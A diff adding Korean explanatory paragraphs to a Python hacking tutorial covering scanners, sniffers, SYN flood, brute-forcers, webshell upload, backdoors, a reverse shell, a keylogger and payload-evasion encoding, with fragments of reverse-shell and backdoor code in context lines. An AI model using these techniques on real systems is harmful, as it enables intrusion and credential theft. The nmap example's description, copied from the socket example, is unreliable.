@@ -3,6 +3,9 @@
 ## 1. 파이썬 기초 (해킹 관점)
 
 ### 모듈 구조
+
+Python 해킹 도구의 기본 모듈 구조입니다. 기능별로 클래스와 함수를 분리하고 argparse로 CLI 인터페이스를 구성합니다.
+
 ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -25,6 +28,9 @@ import paramiko
 ```
 
 ### 클래스 기반 구조
+
+`networkscanner` 클래스를 정의합니다. 관련 상태와 동작을 하나의 객체로 캡슐화하여 재사용성과 유지보수성을 높입니다.
+
 ```python
 class NetworkScanner:
     def __init__(self, target, port_range=(1, 1024)):
@@ -65,6 +71,9 @@ print(scanner.run())
 ## 2. 네트워크 도구
 
 ### 예제 1: 포트 스캐너 (nmap 라이브러리)
+
+Python `socket` 라이브러리를 사용한 멀티스레드 포트 스캐너입니다. TCP 연결 시도로 포트 개방 여부를 확인하며, `ThreadPoolExecutor`로 병렬 처리하여 스캔 속도를 높입니다.
+
 ```python
 import nmap
 
@@ -90,6 +99,9 @@ port_scan("192.168.1.0/24", "22,80,443,3306,8080")
 ```
 
 ### 예제 2: TCP 포트 스캐너 (소켓)
+
+Python `socket` 라이브러리를 사용한 멀티스레드 포트 스캐너입니다. TCP 연결 시도로 포트 개방 여부를 확인하며, `ThreadPoolExecutor`로 병렬 처리하여 스캔 속도를 높입니다.
+
 ```python
 import socket
 import threading
@@ -138,6 +150,9 @@ for port, banner in open_ports:
 ```
 
 ### 예제 3: 패킷 스니퍼 (평문 자격증명 탈취)
+
+소켓으로 네트워크 패킷을 수신하여 평문 자격증명을 탐지하는 스니퍼입니다. HTTP, FTP, Telnet 등 암호화되지 않은 프로토콜의 로그인 정보를 캡처합니다.
+
 ```python
 import socket
 import string
@@ -179,6 +194,9 @@ packet_sniffer()
 ```
 
 ### 예제 4: TCP SYN Flood (DoS 공격 — 학습 및 방어 이해용)
+
+TCP SYN Flood DoS 공격 원리를 Python으로 구현합니다. Raw 소켓으로 다량의 SYN 패킷을 전송하여 대상 서버의 연결 큐를 소진시킵니다.
+
 ```python
 import socket
 import struct
@@ -268,6 +286,9 @@ def syn_flood_demo(dst_ip, dst_port=80, count=10):
 ## 3. 웹 해킹 자동화
 
 ### 예제 5: 웹 로그인 크래커 (딕셔너리 공격)
+
+사전(dictionary) 파일의 패스워드 후보를 하나씩 시도하는 온라인 브루트포스 스크립트입니다. `requests` 라이브러리로 로그인 폼에 POST 요청을 보내고 응답 내용으로 성공 여부를 판단합니다.
+
 ```python
 import requests
 
@@ -337,6 +358,9 @@ def wordpress_crack(site_url, username, wordlist_path):
 ```
 
 ### 예제 6: 웹 파일 업로드 공격
+
+취약한 파일 업로드 기능을 통해 웹셸을 업로드하는 공격을 Python으로 구현합니다. Content-Type 우회와 확장자 필터 우회 기법을 포함합니다.
+
 ```python
 import requests
 
@@ -370,6 +394,9 @@ def use_webshell(webshell_url, command):
 ```
 
 ### 예제 7: 디렉토리 열거 (Directory Listing)
+
+requests 라이브러리로 디렉토리 열거를 수행하는 Python 스크립트입니다. 워드리스트의 각 경로에 HTTP 요청을 보내 존재하는 디렉토리를 찾습니다.
+
 ```python
 import requests
 import threading
@@ -427,6 +454,9 @@ def directory_bruteforce(base_url, wordlist_path, threads=50,
 ## 4. 백도어 및 리버스 쉘
 
 ### 예제 8: 백도어 서버 (피공격자 머신)
+
+원격 명령 실행을 허용하는 백도어 서버 코드입니다. 공격 대상 머신에서 실행되며 공격자의 명령을 받아 결과를 반환합니다.
+
 ```python
 # backdoor_server.py (공격 대상 머신에서 실행)
 from socket import *
@@ -459,6 +489,9 @@ backdoor_server()
 ```
 
 ### 예제 9: 백도어 클라이언트 (공격자 머신에서 제어)
+
+백도어 서버에 연결하여 명령을 전송하고 결과를 받는 클라이언트입니다. 공격자 머신에서 실행되어 원격 시스템을 제어합니다.
+
 ```python
 # backdoor_client.py (공격자 제어 머신에서 실행)
 import socket
@@ -493,6 +526,9 @@ backdoor_client("192.168.1.100")
 ```
 
 ### 예제 10: Python 리버스 쉘 (한 줄 버전)
+
+Python으로 구현한 리버스 쉘입니다. 대상 머신에서 실행되면 공격자의 리스너에 연결을 시도하여 명령 실행 채널을 엽니다.
+
 ```python
 # 리버스 쉘 (대상 머신에서 실행)
 # 공격자 머신: nc -lvnp 4444
@@ -510,6 +546,9 @@ p=subprocess.call(["/bin/sh","-i"])
 ## 5. FTP 크랙 (멀티스레드)
 
 ### 예제 11: FTP 브루트포서
+
+ftplib로 FTP 서비스에 대해 브루트포스 공격을 수행합니다. 워드리스트의 각 비밀번호를 시도하여 유효한 자격증명을 찾습니다.
+
 ```python
 import ftplib
 import threading
@@ -574,6 +613,9 @@ class FTPCracker:
 ## 6. 레지스트리 및 시스템 해킹
 
 ### 예제 12: 레지스트리 사용자 목록 추출
+
+Windows 레지스트리에서 사용자 계정 목록을 추출합니다. winreg 모듈로 SAM 하이브의 사용자 정보에 접근합니다.
+
 ```python
 import winreg  # Windows 전용
 
@@ -621,6 +663,9 @@ def get_registry_users():
 ```
 
 ### 예제 13: 방화벽 레지스트리 확인
+
+Windows 레지스트리에서 방화벽 설정을 확인합니다. 방화벽 비활성화 여부와 예외 규칙을 파악합니다.
+
 ```python
 import winreg
 
@@ -647,6 +692,9 @@ check_firewall_status()
 ## 7. 퍼징 (Fuzzing)
 
 ### 예제 14: 기본 퍼저
+
+버퍼 오버플로우 취약점을 탐지하는 기본 퍼저입니다. 점점 길어지는 입력값을 전송하여 애플리케이션이 비정상 종료되는 시점을 찾습니다.
+
 ```python
 # 버퍼 오버플로우 취약점 탐지용 퍼저
 import socket
@@ -694,6 +742,9 @@ def fuzzer(host, port, payload_size=100, increment=100, max_size=10000):
 ```
 
 ### 예제 15: 바이너리 퍼저 (파일 기반)
+
+파일 기반 바이너리 퍼저입니다. 정상 파일을 변형(bit flip, byte substitution)하여 파서 취약점을 탐지합니다.
+
 ```python
 import os
 import random
@@ -769,6 +820,9 @@ def file_fuzzer(target_binary, seed_file, iterations=1000):
 ## 8. API 후킹 (Windows)
 
 ### 예제 16: Message Hook (키로거 원리)
+
+Windows Message Hook을 이용한 키로거 구현 원리입니다. 시스템 전역 메시지 훅으로 키보드 입력을 캡처합니다.
+
 ```python
 # pywin32 필요: pip install pywin32
 import win32api
@@ -803,6 +857,9 @@ class KeyLogger:
 ## 9. 암호화/복호화
 
 ### 예제 17: XOR 암호화 (간단한 난독화)
+
+XOR 암호화를 Python으로 구현합니다. 악성코드에서 탐지 회피를 위한 단순 난독화에 자주 사용되는 기법입니다.
+
 ```python
 def xor_encrypt(data, key):
     """XOR 암호화/복호화 (같은 키로 역연산 가능)"""
@@ -829,6 +886,9 @@ print(f"Decrypted: {decrypted}")
 ```
 
 ### 예제 18: Base64 인코딩/디코딩 (페이로드 우회)
+
+Base64 인코딩/디코딩을 활용한 페이로드 우회 기법입니다. 방화벽이나 WAF의 시그니처 탐지를 피하기 위해 페이로드를 인코딩합니다.
+
 ```python
 import base64
 
@@ -855,6 +915,8 @@ print(f"URL-safe: {url_safe}")
 ---
 
 ## 10. 통합 해킹 프레임워크 구조
+
+여러 해킹 기능을 통합한 프레임워크 구조입니다. 정찰, 익스플로잇, 후속 공격 모듈을 플러그인 방식으로 확장할 수 있습니다.
 
 ```python
 #!/usr/bin/env python3
